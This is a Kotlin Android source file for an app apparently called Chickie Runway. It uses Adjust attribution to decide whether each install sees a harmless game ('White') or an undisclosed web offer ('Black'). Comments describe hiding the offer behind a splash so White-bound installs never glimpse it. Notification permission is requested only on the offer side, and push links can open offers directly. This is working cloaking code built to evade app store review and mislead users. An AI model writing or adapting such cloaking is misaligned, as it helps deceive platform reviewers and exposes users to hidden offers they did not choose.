package com.chickierunway.game.ui

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.size
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.MaterialTheme
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.key
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.saveable.rememberSaveable
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import androidx.core.content.ContextCompat
import com.chickierunway.game.ChickieApp
import com.chickierunway.game.integration.AdjustManager
import com.chickierunway.game.integration.DeepLinkRouter
import com.chickierunway.game.integration.IntegrationStorage
import com.chickierunway.game.integration.RouteDecision
import com.chickierunway.game.integration.TrafficRouter
import com.chickierunway.game.ui.components.GameBackground
import com.chickierunway.game.ui.navigation.AppNavHost
import com.chickierunway.game.ui.screens.OfferWebViewScreen
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull
import kotlin.coroutines.resume

private const val ATTRIBUTION_TIMEOUT_MS = 8_000L

/** Decides between the game (White) and the offer (Black); a push deep link outranks both. */
@Composable
fun ChickieRoot(app: ChickieApp) {
    var deepLinkUrl by remember { mutableStateOf<String?>(null) }
    var gate by remember { mutableStateOf<RouteDecision?>(null) }
    var painted by remember { mutableStateOf(false) }
    var reroutes by remember { mutableStateOf(0) }

    DisposableEffect(Unit) {
        DeepLinkRouter.setHandler { url -> deepLinkUrl = url }
        onDispose { DeepLinkRouter.clearHandler() }
    }

    LaunchedEffect(reroutes) {
        if (reroutes == 0 && !withContext(Dispatchers.IO) { IntegrationStorage.hasRouteDecision() }) {
            // On a first launch the campaign URL is worthless until attribution lands — wait, but
            // bounded: Adjust may never answer, and an endless splash is worse. Attribution and
            // the adid are awaited in parallel: an organic verdict can land in a second or two,
            // and building the URL right then would let the adid miss the single click.
            withTimeoutOrNull(ATTRIBUTION_TIMEOUT_MS + 2_000L) {
                coroutineScope {
                    launch {
                        suspendCancellableCoroutine { continuation ->
                            AdjustManager.awaitAttribution(ATTRIBUTION_TIMEOUT_MS) {
                                if (continuation.isActive) continuation.resume(Unit)
                            }
                        }
                    }
                    launch(Dispatchers.IO) { AdjustManager.awaitAdid() }
                }
            }
        }
        painted = false
        TrafficRouter.route { decision -> gate = decision }
    }

    // Push permission is asked on the offer side only; the game itself stays prompt-free.
    val isBlack = deepLinkUrl != null || gate is RouteDecision.Black
    NotificationPermissionEffect(enabled = isBlack)

    // A pushed link is opened as sent, with only push_token/push_id appended (off the main
    // thread: appending waits on the token latch).
    var deepLinkFinal by remember { mutableStateOf<String?>(null) }
    LaunchedEffect(deepLinkUrl) {
        val url = deepLinkUrl
        deepLinkFinal = if (url.isNullOrBlank()) null
        else withContext(Dispatchers.IO) { TrafficRouter.appendPushParams(url) }
    }

    val currentDeepLink = deepLinkFinal
    val decision = gate
    when {
        currentDeepLink != null ->
            // A push opens its link without re-deciding the branch or re-pinning the address.
            OfferWebViewScreen(url = currentDeepLink)

        decision is RouteDecision.Black ->
            GameBackground {
                key(decision.url, decision.fromCache) {
                    OfferWebViewScreen(
                        url = decision.url,
                        fromCache = decision.fromCache,
                        onWhiteVerdict = {
                            IntegrationStorage.lockWhite()
                            gate = RouteDecision.White
                        },
                        onOfferCommitted = { committed ->
                            IntegrationStorage.saveOfferUrl(committed)
                            painted = true
                        },
                        onDeadOffer = {
                            if (decision.fromCache) {
                                // Dead cached address: drop it and rebuild the campaign link once.
                                IntegrationStorage.clearOfferUrl()
                                reroutes++
                            } else {
                                // Campaign link failed with a network error: White this launch,
                                // pin nothing, ask again next time.
                                gate = RouteDecision.White
                            }
                        },
                    )
                }
                // A freshly built campaign offer stays hidden behind the splash until it paints, so
                // a White-bound install never sees the offer flash on the way to its 404.
                if (!decision.fromCache && !painted) {
                    CircularProgressIndicator(
                        modifier = Modifier.align(Alignment.Center).size(48.dp),
                        color = MaterialTheme.colorScheme.primary
                    )
                }
            }

        decision is RouteDecision.White -> AppNavHost(app = app)   // starts at MainRoute

        else -> LoadingContent()
    }
}

@Composable
private fun NotificationPermissionEffect(enabled: Boolean) {
    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) return
    val context = LocalContext.current
    val launcher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { /* result ignored: a refusal must not block or break anything */ }
    var asked by rememberSaveable { mutableStateOf(false) }

    LaunchedEffect(enabled) {
        if (!enabled || asked) return@LaunchedEffect
        val granted = ContextCompat.checkSelfPermission(
            context, Manifest.permission.POST_NOTIFICATIONS
        ) == PackageManager.PERMISSION_GRANTED
        if (!granted) {
            asked = true
            launcher.launch(Manifest.permission.POST_NOTIFICATIONS)
        }
    }
}

@Composable
private fun LoadingContent() {
    GameBackground {
        CircularProgressIndicator(
            modifier = Modifier.align(Alignment.Center).size(48.dp),
            color = MaterialTheme.colorScheme.primary
        )
    }
}
